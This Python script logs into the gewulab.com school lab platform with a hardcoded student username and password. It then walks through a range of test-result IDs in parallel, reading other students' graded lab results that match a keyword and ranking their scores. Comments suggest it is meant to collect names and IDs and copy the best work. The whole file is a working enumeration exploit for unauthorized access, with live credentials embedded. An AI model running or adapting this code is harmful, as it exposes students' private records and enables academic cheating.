#!/usr/bin/env python3
# TODO:
#   1. select high score
#   2. show name id
#   3. auto write

import multiprocessing
import time
import requests
import re
from operator import itemgetter
from multiprocessing import Pool
from bs4 import BeautifulSoup


def info(dataType, data):
    print('\033[036m[+]{0}\033[0m: \033[035m{1}\033[0m'.format(dataType, data))
    return data


def login(username, password):
    url = 'http://www.gewulab.com/login/106'
    login_url = 'http://www.gewulab.com/login_check'
    token = ''

    resp = requests.get(url)
    cookie = resp.headers["set-cookie"]

    soup = BeautifulSoup(resp.content, "lxml")
    items = soup.find_all("meta", {"name": "csrf-token"})
    token = items[0]["content"]
    data = {
        '__username': username,
        '_password': password,
        '_username': '106_' + username,
        '_schoolID': 106,
        '_target_path': 'http://www.gewulab.com/homepage/user',
        '_failure_path': '/login/106',
        '_csrf_token': token
    }

    resp = requests.post(login_url,
                         data,
                         headers={"Cookie": cookie},
                         allow_redirects=False)

    cookie = resp.headers['set-cookie']
    result = requests.get("http://www.gewulab.com/test/122000/result",
                          headers={"Cookie": cookie})

    return info("Cookie", cookie)


def getInfo(resp):
    soup = BeautifulSoup(resp.content, "lxml")
    items = soup.find_all("span", {"class": "student"})
    stuName = items[0].get_text()
    items = soup.find_all("span", {"class": "studentNum"})
    stuId = items[0].get_text()
    print(stuName, stuId)


def parseScore(final):
    #  final = sorted(final, reverse=True)
    final = sorted(final.items(), key=itemgetter(1), reverse=True)
    return info("Final", final)


def getScore(resp, target):
    soup = BeautifulSoup(resp.content, "lxml")
    try:
        items = soup.find_all("div", {"class": "label label-success"})
        flag = items[0].get_text()
        if flag == "批阅完成":
            items = soup.find_all("span", {"class": "finalgradeFin"})
            score = items[0].get_text()
            score = re.search(r'\d.*\.\d.*', score).group()[:-2]
            if score is not None:
                return info("Score of " + str(target), score)
            else:
                print("No score")
    except Exception as e:
        print("Status not found!")
        #  raise e


def fuckUp(cookie, target, key, final):
    result = requests.get("http://www.gewulab.com/test/" + str(target) +
                          "/result",
                          headers={"Cookie": cookie})
    content = result.content.decode("utf-8")
    res = re.search(key, content)
    if not res == None:
        info("Oooh Yeah! fuck ", str(target))
        score = getScore(result, target)
        if score:
            final[target] = score
        #  getInfo(result)

    #  else:
    #  print("No fucking result in " + str(target))


def test(cookie, target, key, final):
    result = requests.get("http://www.gewulab.com/test/" + str(target) +
                          "/result",
                          headers={"Cookie": cookie})
    content = result.content.decode("utf-8")
    res = re.search(key, content)
    if not res == None:
        info("Yes", str(target))
        score = getScore(result, target)
        if score:
            final[target] = score
            print(final)
    else:
        print("NO" + str(target))


def run(username=None, password=None, start=None, end=None):

    if username == None or password == None:
        username = '41824142'
        password = 'Dyf12345'
    if start == None or end == None:
        start = 122000
        end = 122100

    final = multiprocessing.Manager().dict()

    #  start = input("start: ")
    #  end = input("end: ")
    #  key = input("keyword: ")

    fuckingPool = Pool(20)
    target = range(int(start), int(end))
    cookie = login(username, password)
    key = "双踪示波法测相位差"

    for i in target:
        #  fuckingPool.apply_async(fuckUp, args=(cookie, i, key))
        fuckingPool.apply_async(test, args=(cookie, i, key, final))

        #  fuckUp(cookie, i, key)

    fuckingPool.close()
    fuckingPool.join()

    final = parseScore(final)
    return final
